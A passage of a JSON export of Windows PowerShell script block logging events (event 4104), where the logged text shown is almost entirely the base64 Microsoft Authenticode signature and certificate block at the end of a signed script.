MjUwNzAxMjE0NjU1WjB8MQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3Rv\r\n# bjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0\r\n# aW9uMSYwJAYDVQQDEx1NaWNyb3NvZnQgVGltZS1TdGFtcCBQQ0EgMjAxMDCCASIw\r\n# DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKkdDbx3EYo6IOz8E5f1+n9plGt0\r\n# VBDVpQoAgoX77XxoSyxfxcPlYcJ2tz5mK1vwFVMnBDEfQRsalR3OCROOfGEwWbEw\r\n# RA/xYIiEVEMM1024OAizQt2TrNZzMFcmgqNFDdDq9UeBzb8kYDJYYEbyWEeGMoQe\r\n# dGFnkV+BVLHPk0ySwcSmXdFhE24oxhr5hoC732H8RsEnHSRnEnIaIYqvS2SJUGKx\r\n# Xf13Hz3wV3WsvYpCTUBR0Q+cBj5nf/VmwAOWRH7v0Ev9buWayrGo8noqCjHw2k4G\r\n# kbaICDXoeByw6ZnNPOcvRLqn9NxkvaQBwSAJk3jN/LzAyURdXhacAQVPIk0CAwEA\r\n# AaOCAeYwggHiMBAGCSsGAQQBgjcVAQQDAgEAMB0GA1UdDgQWBBTVYzpcijGQ80N7\r\n# fEYbxTNoWoVtVTAZBgkrBgEEAYI3FAIEDB4KAFMAdQBiAEMAQTALBgNVHQ8EBAMC\r\n# AYYwDwYDVR0TAQH/BAUwAwEB/zAfBgNVHSMEGDAWgBTV9lbLj+iiXGJo0T2UkFvX\r\n# zpoYxDBWBgNVHR8ETzBNMEugSaBHhkVodHRwOi8vY3JsLm1pY3Jvc29mdC5jb20v\r\n# cGtpL2NybC9wcm9kdWN0cy9NaWNSb29DZXJBdXRfMjAxMC0wNi0yMy5jcmwwWgYI\r\n# KwYBBQUHAQEETjBMMEoGCCsGAQUFBzAChj5odHRwOi8vd3d3Lm1pY3Jvc29mdC5j\r\n# b20vcGtpL2NlcnRzL01pY1Jvb0NlckF1dF8yMDEwLTA2LTIzLmNydDCBoAYDVR0g\r\n# AQH/BIGVMIGSMIGPBgkrBgEEAYI3LgMwgYEwPQYIKwYBBQUHAgEWMWh0dHA6Ly93\r\n# d3cubWljcm9zb2Z0LmNvbS9QS0kvZG9jcy9DUFMvZGVmYXVsdC5odG0wQAYIKwYB\r\n# BQUHAgIwNB4yIB0ATABlAGcAYQBsAF8AUABvAGwAaQBjAHkAXwBTAHQAYQB0AGUA\r\n# bQBlAG4AdAAuIB0wDQYJKoZIhvcNAQELBQADggIBAAfmiFEN4sbgmD+BcQM9naOh\r\n# IW+z66bM9TG+zwXiqf76V20ZMLPCxWbJat/15/B4vceoniXj+bzta1RXCCtRgkQS\r\n# +7lTjMz0YBKKdsxAQEGb3FwX/1z5Xhc1mCRWS3TvQhDIr79/xn/yN31aPxzymXlK\r\n# kVIArzgPF/UveYFl2am1a+THzvbKegBvSzBEJCI8z+0DpZaPWSm8tv0E4XCfMkon\r\n# /VWvL/625Y4zu2JfmttXQOnxzplmkIz/amJ/3cVKC5Em4jnsGUpxY517IW3DnKOi\r\n# PPp/fZZqkHimbdLhnPkd/DjYlPTGpQqWhqS9nhquBEKDuLWAmyI4ILUl5WTs9/S/\r\n# fmNZJQ96LjlXdqJxqgaKD4kWumGnEcua2A5HmoDF0M2n0O99g/DhO3EJ3110mCII\r\n# YdqwUB5vvfHhAN/nMQekkzr3ZUd46PioSKv33nJ+YWtvd6mBy6cJrDm77MbL2IK0\r\n# cs0d9LiFAR6A+xuJKlQ5slvayA1VmXqHczsI5pgt6o3gMy4SKfXAL1QnIffIrE7a\r\n# KLixqduWsqdCosnPGUFN4Ib5KpqjEWYw07t0MkvfY3v1mYovG8chr1m1rtxEPJdQ\r\n# cdeh0sVV42neV8HR3jDA/czmTfsNv11P6Z0eGTgvvM9YBS7vDaBQNdrvCScc1bN+\r\n# NR4Iuto229Nfj950iEkSoYIC0jCCAjsCAQEwgfyhgdSkgdEwgc4xCzAJBgNVBAYT\r\n# AlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYD\r\n# VQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1pY3Jvc29mdCBP\r\n# cGVyYXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMgVFNTIEVTTjow\r\n# QTU2LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUtU3RhbXAgU2Vy\r\n# dmljZaIjCgEBMAcGBSsOAwIaAxUAs5W4TmyDHMRM7iz6mgGojqvXHzOggYMwgYCk\r\n# fjB8MQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMH\r\n# UmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0aW9uMSYwJAYDVQQD\r\n# Ex1NaWNyb3NvZnQgVGltZS1TdGFtcCBQQ0EgMjAxMDANBgkqhkiG9w0BAQUFAAIF\r\n# AOMUsu8wIhgPMjAyMDA5MjIyMTI5MTlaGA8yMDIwMDkyMzIxMjkxOVowdzA9Bgor\r\n# BgEEAYRZCgQBMS8wLTAKAgUA4xSy7wIBADAKAgEAAgIVPgIB/zAHAgEAAgIRtjAK\r\n# AgUA4xYEbwIBADA2BgorBgEEAYRZCgQCMSgwJjAMBgorBgEEAYRZCgMCoAowCAIB\r\n# AAIDB6EgoQowCAIBAAIDAYagMA0GCSqGSIb3DQEBBQUAA4GBAEMD4esQRMLwQdhk\r\n# Co1zgvmclcwl3lYYpk1oMh1ndsU3+97Rt6FV3adS4Hezc/K94oQKjcxtMVzLzQhG\r\n# agM6XlqB31VD8n2nxVuaWD1yp2jm/0IvfL9nFMHJRhgANMiBdHqvqNrd86c/Kryq\r\n# sI0Ch0sOx9wg3BozzqQhmdNjf9c6MYIDDTCCAwkCAQEwgZMwfDELMAkGA1UEBhMC\r\n# VVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQxHjAcBgNV\r\n# BAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEmMCQGA1UEAxMdTWljcm9zb2Z0IFRp\r\n# bWUtU3RhbXAgUENBIDIwMTACEzMAAAEnL26j75GoGagAAAAAAScwDQYJYIZIAWUD\r\n# BAIBBQCgggFKMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAvBgkqhkiG9w0B\r\n# CQQxIgQg6wLE4god37E/zRxYUqM58DbGQBLJxEvt6c6xU1jsZqYwgfoGCyqGSIb3\r\n# DQEJEAIvMYHqMIHnMIHkMIG9BCAbkuhLEoYdahb/BUyVszO2VDi6kB3MSaof/+8u\r\n# 7SM+IjCBmDCBgKR+MHwxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9u\r\n# MRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRp\r\n# b24xJjAkBgNVBAMTHU1pY3Jvc29mdCBUaW1lLVN0YW1wIFBDQSAyMDEwAhMzAAAB\r\n# Jy9uo++RqBmoAAAAAAEnMCIEIK4r6N3NISekswMCG1kSBJCCCePrlLDQWbMKz0wt\r\n# Lj6CMA0GCSqGSIb3DQEBCwUABIIBACY3cZHtQ2k6zfVG4NotND24Zp0mlZAFe4A+\r\n# BFDISaaIXS86mO142Y9Hkm9rAMBCIJbKB/Yj1yf1gbygqNCoJDHFxZbdmx5XbShg\r\n# PVfAQl00TuyQ86VYnFJtvdDODUnwuxErAFR1zyiGGBKYtQWhXNRmbhb1kRkWp5Fg\r\n# s9mwzZUoGI2UzXDtYb6HkjNIOMxCbWW/27YfCBnOkiP2tJMIU79R4xY4vwQeWkKW\r\n# dgtyHv+d7eBOd1aOi8HvqCstH6x06RC3DsYfZ/NbYSGuZpjSaSDDC7A1KvdPo6ti\r\n# UYayEGi9iXfqnAv4Iyzo3OWIN2M2iqepP2xwL8Ne2q1ImLpiZF0=\r\n# SIG # End signature block\r\n\r\n\r\nScriptBlock ID: 0da8a895-b218-499e-a753-00ffdd914c86\r\nPath: </Message><Level>Warning</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "5",
                    "MessageTotal": "5",
                    "ScriptBlockText": "yMNxE2DF7vFdvaiZP0CVZ5ByJ2gAhXMdK9+usx\n# zVk913qKde1OAuWdv+rndqkAIm8fUlRnr4saSCg7cIbUwCCf116wUJ7EuJDg0vHe\n# yhnCeHnBbyH3RZkHEi2ofmfgnFISJZDdMAeVZGVOh20Jp50XBzqokpPzeZ6zc1/g\n# yILNyiVgE+RPkjnUQshd1f1PMgn3tns2Cz7bJiVUaqEO3n9qRFgy5JuLae6UweGf\n# AeOo3dgLZxikKzYs3hDMaEtJq8IP71cX7QXe6lnMmXU/Hdfz2p897Zd+kU+vZvKI\n# 3cwLfuVQgK2RZ2z+Kc3K3dRPz2rXycK5XCuRZmvGab/WbrZiC7wJQapgBodltMI5\n# GMdFrBg9IeF7/rP4EqVQXeKtevTlZXjpuNhhjuR+2DMt/dWufjXpiW91bo3aH6Ea\n# jOALXmoxgltCp1K7hrS6gmsvj94cLRf50QQ4U8Qwggd6MIIFYqADAgECAgphDpDS\n# AAAAAAADMA0GCSqGSIb3DQEBCwUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMK\n# V2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0\n# IENvcnBvcmF0aW9uMTIwMAYDVQQDEylNaWNyb3NvZnQgUm9vdCBDZXJ0aWZpY2F0\n# ZSBBdXRob3JpdHkgMjAxMTAeFw0xMTA3MDgyMDU5MDlaFw0yNjA3MDgyMTA5MDla\n# MH4xCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdS\n# ZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKDAmBgNVBAMT\n# H01pY3Jvc29mdCBDb2RlIFNpZ25pbmcgUENBIDIwMTEwggIiMA0GCSqGSIb3DQEB\n# AQUAA4ICDwAwggIKAoICAQCr8PpyEBwurdhuqoIQTTS68rZYIZ9CGypr6VpQqrgG\n# OBoESbp/wwwe3TdrxhLYC/A4wpkGsMg51QEUMULTiQ15ZId+lGAkbK+eSZzpaF7S\n# 35tTsgosw6/ZqSuuegmv15ZZymAaBelmdugyUiYSL+erCFDPs0S3XdjELgN1q2jz\n# y23zOlyhFvRGuuA4ZKxuZDV4pqBjDy3TQJP4494HDdVceaVJKecNvqATd76UPe/7\n# 4ytaEB9NViiienLgEjq3SV7Y7e1DkYPZe7J7hhvZPrGMXeiJT4Qa8qEvWeSQOy2u\n# M1jFtz7+MtOzAz2xsq+SOH7SnYAs9U5WkSE1JcM5bmR/U7qcD60ZI4TL9LoDho33\n# X/DQUr+MlIe8wCF0JV8YKLbMJyg4JZg5SjbPfLGSrhwjp6lm7GEfauEoSZ1fiOIl\n# XdMhSz5SxLVXPyQD8NF6Wy/VI+NwXQ9RRnez+ADhvKwCgl/bwBWzvRvUVUvnOaEP\n# 6SNJvBi4RHxF5MHDcnrgcuck379GmcXvwhxX24ON7E1JMKerjt/sW5+v/N2wZuLB\n# l4F77dbtS+dJKacTKKanfWeA5opieF+yL4TXV5xcv3coKPHtbcMojyyPQDdPweGF\n# RInECUzF1KVDL3SV9274eCBYLBNdYJWaPk8zhNqwiBfenk70lrC8RqBsmNLg1oiM\n# CwIDAQABo4IB7TCCAekwEAYJKwYBBAGCNxUBBAMCAQAwHQYDVR0OBBYEFEhuZOVQ\n# BdOCqhc3NyK1bajKdQKVMBkGCSsGAQQBgjcUAgQMHgoAUwB1AGIAQwBBMAsGA1Ud\n# DwQEAwIBhjAPBgNVHRMBAf8EBTADAQH/MB8GA1UdIwQYMBaAFHItOgIxkEO5FAVO\n# 4eqnxzHRI4k0MFoGA1UdHwRTMFEwT6BNoEuGSWh0dHA6Ly9jcmwubWljcm9zb2Z0\n# LmNvbS9wa2kvY3JsL3Byb2R1Y3RzL01pY1Jvb0NlckF1dDIwMTFfMjAxMV8wM18y\n# Mi5jcmwwXgYIKwYBBQUHAQEEUjBQME4GCCsGAQUFBzAChkJodHRwOi8vd3d3Lm1p\n# Y3Jvc29mdC5jb20vcGtpL2NlcnRzL01pY1Jvb0NlckF1dDIwMTFfMjAxMV8wM18y\n# Mi5jcnQwgZ8GA1UdIASBlzCBlDCBkQYJKwYBBAGCNy4DMIGDMD8GCCsGAQUFBwIB\n# FjNodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vcGtpb3BzL2RvY3MvcHJpbWFyeWNw\n# cy5odG0wQAYIKwYBBQUHAgIwNB4yIB0ATABlAGcAYQBsAF8AcABvAGwAaQBjAHkA\n# XwBzAHQAYQB0AGUAbQBlAG4AdAAuIB0wDQYJKoZIhvcNAQELBQADggIBAGfyhqWY\n# 4FR5Gi7T2HRnIpsLlhHhY5KZQpZ90nkMkMFlXy4sPvjDctFtg/6+P+gKyju/R6mj\n# 82nbY78iNaWXXWWEkH2LRlBV2AySfNIaSxzzPEKLUtCw/WvjPgcuKZvmPRul1LUd\n# d5Q54ulkyUQ9eHoj8xN9ppB0g430yyYCRirCihC7pKkFDJvtaPpoLpWgKj8qa1hJ\n# Yx8JaW5amJbkg/TAj/NGK978O9C9Ne9uJa7lryft0N3zDq+ZKJeYTQ49C/IIidYf\n# wzIY4vDFLc5bnrRJOQrGCsLGra7lstnbFYhRRVg4MnEnGn+x9Cf43iw6IGmYslmJ\n# aG5vp7d0w0AFBqYBKig+gj8TTWYLwLNN9eGPfxxvFX1Fp3blQCplo8NdUmKGwx1j\n# NpeG39rz+PIWoZon4c2ll9DuXWNB41sHnIc+BncG0QaxdR8UvmFhtfDcxhsEvt9B\n# xw4o7t5lL+yX9qFcltgA1qFGvVnzl6UJS0gQmYAf0AApxbGbpT9Fdx41xtKiop96\n# eiL6SJUfq/tHI4D1nvi/a7dLl+LrdXga7Oo3mXkYS//WsyNodeav+vyL6wuA6mk7\n# r/ww7QRMjt/fdW1jkT3RnVZOT7+AVyKheBEyIXrvQQqxP/uozKRdwaGIm1dxVk5I\n# RcBCyZt2WwqASGv9eZ/BvW1taslScxMNelDNMYIVZzCCFWMCAQEwgZUwfjELMAkG\n# A1UEBhMCVVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQx\n# HjAcBgNVBAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEoMCYGA1UEAxMfTWljcm9z\n# b2Z0IENvZGUgU2lnbmluZyBQQ0EgMjAxMQITMwAAAYdyF3IVWUDHCQAAAAABhzAN\n# BglghkgBZQMEAgEFAKCBrjAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor\n# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAvBgkqhkiG9w0BCQQxIgQgLIu7f8le\n# gQ0ndTd8gyAEe0fnNBrhCsEUfHD+upEyb7owQgYKKwYBBAGCNwIBDDE0MDKgFIAS\n# AE0AaQBjAHIAbwBzAG8AZgB0oRqAGGh0dHA6Ly93d3cubWljcm9zb2Z0LmNvbTAN\n# BgkqhkiG9w0BAQEFAASCAQCWjkfbjU+QuaidvjCSfT9ZWmVRt7eVzD7wasyZEXwC\n# uPWX5GwoR4xPMYzA/ohAElfSdrP6HWH9R+2sdXnUCJK+7w6N9wbB+S9Da0r3UcHj\n# acV7JEftJK6ZwZ9EyebTgHv6Oa0xhuaRh/BINH4OhfIZEy3A2Lg4KhvNMjGKHTi2\n# agmGkKLUqySkyv48c/HCApLbZ3ugNqI06C284kostGCqpuSg6HRDcGPDzZSkT6l4\n# u1veNMmcpeGzd3NTNy5fkt8jQt3OUQ9NmfYN5nxh1BgDB1kyDm5lWMiZqFqlLS9T\n# sG/jgYnqnprYVqTa8rYsSdmn8y1idSkQ1M715PQlOYNuoYIS8TCCEu0GCisGAQQB\n# gjcDAwExghLdMIIS2QYJKoZIhvcNAQcCoIISyjCCEsYCAQMxDzANBglghkgBZQME\n# AgEFADCCAVUGCyqGSIb3DQEJEAEEoIIBRASCAUAwggE8AgEBBgorBgEEAYRZCgMB\n# MDEwDQYJYIZIAWUDBAIBBQAEIOjiV1RbUVB0CleqHpkpsACXwys4XtATfTNyD7Bu\n# Zv+1AgZfYPphXsEYEzIwMjAwOTIyMjIxOTUxLjg2N1owBIACAfSggdSkgdEwgc4x\n# CzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRt\n# b25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1p\n# Y3Jvc29mdCBPcGVyYXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMg\n# VFNTIEVTTjowQTU2LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUt\n# U3RhbXAgU2VydmljZaCCDkQwggT1MIID3aADAgECAhMzAAABJy9uo++RqBmoAAAA\n# AAEnMA0GCSqGSIb3DQEBCwUAMHwxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNo\n# aW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29y\n# cG9yYXRpb24xJjAkBgNVBAMTHU1pY3Jvc29mdCBUaW1lLVN0YW1wIFBDQSAyMDEw\n# MB4XDTE5MTIxOTAxMTQ1OVoXDTIxMDMxNzAxMTQ1OVowgc4xCzAJBgNVBAYTAlVT\n# MRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQK\n# ExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1pY3Jvc29mdCBPcGVy\n# YXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMgVFNTIEVTTjowQTU2\n# LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUtU3RhbXAgU2Vydmlj\n# ZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPgB3nERnk6fS40vvWeD\n# 3HCgM9Ep4xTIQiPnJXE9E+HkZVtTsPemoOyhfNAyF95E/rUvXOVTUcJFL7Xb16jT\n# KPXONsCWY8DCixSDIiid6xa30TiEWVcIZRwiDlcx29D467OTav5rA1G6TwAEY5rQ\n# jhUHLrOoJgfJfakZq6IHjd+slI0/qlys7QIGakFk2OB6mh/ln/nS8G4kNRK6Do4g\n# xDtnBSFLNfhsSZlRSMDJwFvrZ2FCkaoexd7rKlUNOAAScY411IEqQeI1PwfRm3aW\n# bS8IvAfJPC2Ah2LrtP8sKn5faaU8epexje7vZfcZif/cbxgUKStJzqbdvTBNc93n\n# /Z8CAwEAAaOCARswggEXMB0GA1UdDgQWBBTl9JZVgF85MSRbYlOJXbhY022V8jAf\n# BgNVHSMEGDAWgBTVYzpcijGQ80N7fEYbxTNoWoVtVTBWBgNVHR8ETzBNMEugSaBH\n# hkVodHRwOi8vY3JsLm1pY3Jvc29mdC5jb20vcGtpL2NybC9wcm9kdWN0cy9NaWNU\n# aW1TdGFQQ0FfMjAxMC0wNy0wMS5jcmwwWgYIKwYBBQUHAQEETjBMMEoGCCsGAQUF\n# BzAChj5odHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vcGtpL2NlcnRzL01pY1RpbVN0\n# YVBDQV8yMDEwLTA3LTAxLmNydDAMBgNVHRMBAf8EAjAAMBMGA1UdJQQMMAoGCCsG\n# AQUFBwMIMA0GCSqGSIb3DQEBCwUAA4IBAQAKyo180VXHBqVnjZwQy7NlzXbo2+W5\n# qfHxR7ANV5RBkRkdGamkwUcDNL+DpHObFPJHa0oTeYKE0Zbl1MvvfS8RtGGdhGYG\n# CJf+BPd/gBCs4+dkZdjvOzNyuVuDPGlqQ5f7HS7iuQ/cCyGHcHYJ0nXVewF2Lk+J\n# lrWykHpTlLwPXmCpNR+gieItPi/UMF2RYTGwojW+yIVwNyMYnjFGUxEX5/DtJjRZ\n# mg7PBHMrENN2DgO6wBelp4ptyH2KK2EsWT+8jFCuoKv+eJby0QD55LN5f8SrUPRn\n# K86fh7aVOfCglQofo5ABZIGiDIrg4JsV4k6p0oBSIFOAcqRAhiH+1spCMIIGcTCC\n# BFmgAwIBAgIKYQmBKgAAAAAAAjANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMC\n# VVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQxHjAcBgNV\n# BAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEyMDAGA1UEAxMpTWljcm9zb2Z0IFJv\n# b3QgQ2VydGlmaWNhdGUgQXV0aG9yaXR5IDIwMTAwHhcNMTAwNzAxMjEzNjU1WhcN\n# MjUwNzAxMjE0NjU1WjB8MQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3Rv\n# bjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0\n# aW9uMSYwJAYDVQQDEx1NaWNyb3NvZnQgVGltZS1TdGFtcCBQQ0EgMjAxMDCCASIw\n# DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKkdDbx3EYo6IOz8E5f1+n9plGt0\n# VBDVpQoAgoX77XxoSyxfxcPlYcJ2tz5mK1vwFVMnBDEfQRsalR3OCROOfGEwWbEw\n# RA/xYIiEVEMM1024OAizQt2TrNZzMFcmgqNFDdDq9UeBzb8kYDJYYEbyWEeGMoQe\n# dGFnkV+BVLHPk0ySwcSmXdFhE24oxhr5hoC732H8RsEnHSRnEnIaIYqvS2SJUGKx\n# Xf13Hz3wV3WsvYpCTUBR0Q+cBj5nf/VmwAOWRH7v0Ev9buWayrGo8noqCjHw2k4G\n# kbaICDXoeByw6ZnNPOcvRLqn9NxkvaQBwSAJk3jN/LzAyURdXhacAQVPIk0CAwEA\n# AaOCAeYwggHiMBAGCSsGAQQBgjcVAQQDAgEAMB0GA1UdDgQWBBTVYzpcijGQ80N7\n# fEYbxTNoWoVtVTAZBgkrBgEEAYI3FAIEDB4KAFMAdQBiAEMAQTALBgNVHQ8EBAMC\n# AYYwDwYDVR0TAQH/BAUwAwEB/zAfBgNVHSMEGDAWgBTV9lbLj+iiXGJo0T2UkFvX\n# zpoYxDBWBgNVHR8ETzBNMEugSaBHhkVodHRwOi8vY3JsLm1pY3Jvc29mdC5jb20v\n# cGtpL2NybC9wcm9kdWN0cy9NaWNSb29DZXJBdXRfMjAxMC0wNi0yMy5jcmwwWgYI\n# KwYBBQUHAQEETjBMMEoGCCsGAQUFBzAChj5odHRwOi8vd3d3Lm1pY3Jvc29mdC5j\n# b20vcGtpL2NlcnRzL01pY1Jvb0NlckF1dF8yMDEwLTA2LTIzLmNydDCBoAYDVR0g\n# AQH/BIGVMIGSMIGPBgkrBgEEAYI3LgMwgYEwPQYIKwYBBQUHAgEWMWh0dHA6Ly93\n# d3cubWljcm9zb2Z0LmNvbS9QS0kvZG9jcy9DUFMvZGVmYXVsdC5odG0wQAYIKwYB\n# BQUHAgIwNB4yIB0ATABlAGcAYQBsAF8AUABvAGwAaQBjAHkAXwBTAHQAYQB0AGUA\n# bQBlAG4AdAAuIB0wDQYJKoZIhvcNAQELBQADggIBAAfmiFEN4sbgmD+BcQM9naOh\n# IW+z66bM9TG+zwXiqf76V20ZMLPCxWbJat/15/B4vceoniXj+bzta1RXCCtRgkQS\n# +7lTjMz0YBKKdsxAQEGb3FwX/1z5Xhc1mCRWS3TvQhDIr79/xn/yN31aPxzymXlK\n# kVIArzgPF/UveYFl2am1a+THzvbKegBvSzBEJCI8z+0DpZaPWSm8tv0E4XCfMkon\n# /VWvL/625Y4zu2JfmttXQOnxzplmkIz/amJ/3cVKC5Em4jnsGUpxY517IW3DnKOi\n# PPp/fZZqkHimbdLhnPkd/DjYlPTGpQqWhqS9nhquBEKDuLWAmyI4ILUl5WTs9/S/\n# fmNZJQ96LjlXdqJxqgaKD4kWumGnEcua2A5HmoDF0M2n0O99g/DhO3EJ3110mCII\n# YdqwUB5vvfHhAN/nMQekkzr3ZUd46PioSKv33nJ+YWtvd6mBy6cJrDm77MbL2IK0\n# cs0d9LiFAR6A+xuJKlQ5slvayA1VmXqHczsI5pgt6o3gMy4SKfXAL1QnIffIrE7a\n# KLixqduWsqdCosnPGUFN4Ib5KpqjEWYw07t0MkvfY3v1mYovG8chr1m1rtxEPJdQ\n# cdeh0sVV42neV8HR3jDA/czmTfsNv11P6Z0eGTgvvM9YBS7vDaBQNdrvCScc1bN+\n# NR4Iuto229Nfj950iEkSoYIC0jCCAjsCAQEwgfyhgdSkgdEwgc4xCzAJBgNVBAYT\n# AlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYD\n# VQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAsTIE1pY3Jvc29mdCBP\n# cGVyYXRpb25zIFB1ZXJ0byBSaWNvMSYwJAYDVQQLEx1UaGFsZXMgVFNTIEVTTjow\n# QTU2LUUzMjktNEQ0RDElMCMGA1UEAxMcTWljcm9zb2Z0IFRpbWUtU3RhbXAgU2Vy\n# dmljZaIjCgEBMAcGBSsOAwIaAxUAs5W4TmyDHMRM7iz6mgGojqvXHzOggYMwgYCk\n# fjB8MQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMH\n# UmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0aW9uMSYwJAYDVQQD\n# Ex1NaWNyb3NvZnQgVGltZS1TdGFtcCBQQ0EgMjAxMDANBgkqhkiG9w0BAQUFAAIF\n# AOMUsu8wIhgPMjAyMDA5MjIyMTI5MTlaGA8yMDIwMDkyMzIxMjkxOVowdzA9Bgor\n# BgEEAYRZCgQBMS8wLTAKAgUA4xSy7wIBADAKAgEAAgIVPgIB/zAHAgEAAgIRtjAK\n# AgUA4xYEbwIBADA2BgorBgEEAYRZCgQCMSgwJjAMBgorBgEEAYRZCgMCoAowCAIB\n# AAIDB6EgoQowCAIBAAIDAYagMA0GCSqGSIb3DQEBBQUAA4GBAEMD4esQRMLwQdhk\n# Co1zgvmclcwl3lYYpk1oMh1ndsU3+97Rt6FV3adS4Hezc/K94oQKjcxtMVzLzQhG\n# agM6XlqB31VD8n2nxVuaWD1yp2jm/0IvfL9nFMHJRhgANMiBdHqvqNrd86c/Kryq\n# sI0Ch0sOx9wg3BozzqQhmdNjf9c6MYIDDTCCAwkCAQEwgZMwfDELMAkGA1UEBhMC\n# VVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1vbmQxHjAcBgNV\n# BAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEmMCQGA1UEAxMdTWljcm9zb2Z0IFRp\n# bWUtU3RhbXAgUENBIDIwMTACEzMAAAEnL26j75GoGagAAAAAAScwDQYJYIZIAWUD\n# BAIBBQCgggFKMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAvBgkqhkiG9w0B\n# CQQxIgQg6wLE4god37E/zRxYUqM58DbGQBLJxEvt6c6xU1jsZqYwgfoGCyqGSIb3\n# DQEJEAIvMYHqMIHnMIHkMIG9BCAbkuhLEoYdahb/BUyVszO2VDi6kB3MSaof/+8u\n# 7SM+IjCBmDCBgKR+MHwxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9u\n# MRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRp\n# b24xJjAkBgNVBAMTHU1pY3Jvc29mdCBUaW1lLVN0YW1wIFBDQSAyMDEwAhMzAAAB\n# Jy9uo++RqBmoAAAAAAEnMCIEIK4r6N3NISekswMCG1kSBJCCCePrlLDQWbMKz0wt\n# Lj6CMA0GCSqGSIb3DQEBCwUABIIBACY3cZHtQ2k6zfVG4NotND24Zp0mlZAFe4A+\n# BFDISaaIXS86mO142Y9Hkm9rAMBCIJbKB/Yj1yf1gbygqNCoJDHFxZbdmx5XbShg\n# PVfAQl00TuyQ86VYnFJtvdDODUnwuxErAFR1zyiGGBKYtQWhXNRmbhb1kRkWp5Fg\n# s9mwzZUoGI2UzXDtYb6HkjNIOMxCbWW/27YfCBnOkiP2tJMIU79R4xY4vwQeWkKW\n# dgtyHv+d7eBOd1aOi8HvqCstH6x06RC3DsYfZ/NbYSGuZpjSaSDDC7A1KvdPo6ti\n# UYayEGi9iXfqnAv4Iyzo3OWIN2M2iqepP2xwL8Ne2q1ImLpiZF0=\n# SIG # End signature block",
                    "ScriptBlockId": "0da8a895-b218-499e-a753-00ffdd914c86"
                }
            }
        },
        {
            "@timestamp": "2025-12-23T19:00:20.640Z",
            "event": {
